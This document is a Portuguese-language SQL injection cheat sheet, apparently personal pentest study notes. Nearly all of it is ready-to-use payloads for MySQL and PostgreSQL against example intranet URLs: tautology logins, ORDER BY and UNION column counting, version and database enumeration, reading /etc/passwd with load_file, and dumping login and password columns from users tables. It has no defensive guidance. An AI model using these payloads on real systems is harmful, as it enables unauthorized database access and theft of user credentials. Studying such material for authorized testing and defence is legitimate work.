# SQL Injection

SQL = Structured Query Language
SQL é uma linguagem para gerenciar o banco de dados mas não é o banco de dados em si.

Os principais bancos de dados que utilizam o SQL são:
- Oracle
- SQL Server
- Mysql
- DB2
- PostgreSQL

---

SQLi básico:
teste' or 1=1;# **Preenchimento no formulário.**
http://intranet.businesscorp.com.br:8080/cat.php?id=3 or 1=1;# **Método GET via URL.**

SQLi limitando número de saídas:
teste' or 1=1 limit 1;# **Preenchimento no formulário.**

SQLi básico para ter uma saída mais limpa:
http://intranet.alvo.com.br:8080/cat.php?id=-1

Para descobrir o número de colunas é necessário ir incrementando até o erro ocorrer:
http://intranet.alvo.com.br:8080/cat.php?id=-1 order by 1 (Sem erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 order by 2 (Sem erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 order by 3 (Sem erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 order by 4 (Sem erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 order by 5 (**Com erro**)
*Nesse caso essa tabela possui 4 colunas.*

Também podemos descobrir o número de colunas através do UNION SELECT:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1 (Sem erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,2 (Sem erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,2,3 (Sem erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,2,3,4 (Sem erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,2,3,4,5 (**Com erro**)
*Nesse caso essa tabela possui 4 colunas.*

Agora devemos escolher um dos números que aparecem no site:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,"Teste",3,4
*A palavra **Teste** deve aparecer em algum lugar na página.*

Trazer a versão do Mysql:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,@@version,3,4
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,version(),3,4

Trazer nome do banco de dados:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,database(),3,4

Verificar usuário atual:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,current_user(),3,4

Verificar todos os bancos de dados:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata

Verificando todas as tabelas:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,table_name,3,4 from information_schema.tables;

Verificando as tabelas em um banco de dados específico:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema="nome_do_db";

Verificando as colunas de uma tabela:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,column_name,3,4 from information_schema.columns where table_schema="nome_do_db" and table_name="nome_tabela";

Sabendo o nome da tabela e da coluna podemos efetuar um dump:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,login,3,4 from users;
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,password,3,4 from users;

Mostrando mais de uma informação por vez:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 1,concat(login,':',password),3,4 from users;

---

## SQL Injection (Blind)

Quando a informação passada for verdade a aplicação irá retornar algo, porém sendo falso a aplicação não irá retornar nada.

Lógica Booleana (verdadeiro[1] ou falso[0])

SQL Injection (Blind) básico:
1' and 1=1#

Para descobrir o número de colunas é necessário ir incrementando até a aplicação não retornar nada:
1' and 1=1 order by 1# (Com retorno da aplicação)
1' and 1=1 order by 2# (Com retorno da aplicação)
1' and 1=1 order by 3# (**Sem retorno da aplicação**)
*Ou seja, temos apenas duas colunas nessa tabela.*

Também podemos descobrir o número de colunas através do UNION SELECT:
1' and 1=1 union select 1# (Sem retorno da aplicação)
1' and 1=1 union select 1,2# (**Com retorno da aplicação**)
1' and 1=1 union select 1,2,3# (Sem retorno da aplicação)
*Como somente o segundo form está verdadeiro a aplicação irá responder.*

Teste número por número para que possamos identificar qual é exibido na aplicação:
1' and 1=1 union select 'teste1',2#
1' and 1=1 union select 1,'teste2'#

Tentando carregar arquivo do sistema:
1' and 1=1 union select 1,load_file('/etc/passwd')#

Verificando todas as tabelas:
1' and 1=1 union select 1,table_name from information_schema.tables#

Verificando as colunas de uma tabela:
1' and 1=1 union select 1,column_name from information_schema.columns where table_name='nome_tabela'#

Sabendo o nome da tabela e da coluna podemos efetuar um dump:
1' and 1=1 union select 1,user from users#
1' and 1=1 union select 1,password from users#

## SQL Injection PostgreSQL

No banco de dados PostgreSQL no lugar de números no **union select** iremos utilizar **null**.
O restante fica tudo muito parecido com o MySQL.

Para descobrir o número de colunas é necessário ir incrementando até o erro ocorrer:
http://intranet.alvo.com.br:8080/cat.php?id=-1 order by 1 (Sem erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 order by 2 (Sem erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 order by 3 (Sem erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 order by 4 (Sem erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 order by 5 (**Com erro**)
*Nesse caso essa tabela possui 4 colunas.*

Descobrir o número de colunas através do UNION SELECT:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null (Com erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null,null (Com erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null,null,null (Comm erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null,null,null,null (**Sem erro**)
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null,null,null,null,null (Com erro)
*Nesse caso essa tabela possui 4 colunas.*

Validando a coluna onde usaremos para pegar as informações:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select 'null',null,null,null (Com erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null,'null',null,null (**Sem erro**)
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null,null,'null',null (Com erro)
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null,null,null,'null' (Com erro)
*A aplicação replica a informação na página através do campo dois.*

Verificar todos os bancos de dados:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null,datname,null,null from pg_database;

Verificando todas as tabelas:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null,tablename,null,null from pg_tables;
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null,table_name,null,null from information_schema.tables;

Verificando as tabelas em um banco de dados específico:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null,table_name,null,null from information_schema.tables where table_catalog='nome_do_db';

Verificando as colunas de uma tabela:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null,column_name,null,null from information_schema.columns where table_name="nome_da_tabela";

Sabendo o nome da tabela e da coluna podemos efetuar um dump:
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null,login,null,null from users;
http://intranet.alvo.com.br:8080/cat.php?id=-1 union select null,password,null,null from users;
